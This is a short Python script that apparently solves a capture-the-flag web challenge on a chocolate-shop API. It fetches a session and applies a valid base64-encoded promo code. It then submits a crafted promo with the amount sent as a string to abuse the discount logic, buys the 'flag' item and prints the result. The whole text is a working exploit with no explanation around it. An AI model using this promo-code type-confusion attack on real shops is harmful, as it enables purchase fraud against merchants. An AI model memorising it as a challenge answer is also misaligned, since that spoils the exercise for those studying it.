import requests
import base64
import json

URL_BASE = "https://chococore-faii4kxv.alfactf.ru/api"

session = requests.Session()

# 1. Get session ID
r = session.get(f"{URL_BASE}/session")
session_id = session.cookies.get("session_id")

# 2. Apply a valid promo
valid_promo = base64.b64encode(json.dumps({'amount': 5000, 'coupon': 'TREAT5000'}).encode()).decode()
session.post(f"{URL_BASE}/promocode", json={"code": valid_promo})

# 3. Apply the malicious promo (amount as string)
malicious_promo = base64.b64encode(json.dumps({'amount': "31337", 'coupon': 'FAKE'}).encode()).decode()
session.post(f"{URL_BASE}/promocode", json={"code": malicious_promo})

# 4. Buy the flag
session.post(f"{URL_BASE}/cart", json={"chocolateId": "flag", "quantity": 1})
session.post(f"{URL_BASE}/checkout")
r_flag = session.get(f"{URL_BASE}/completed")
print(r_flag.text)
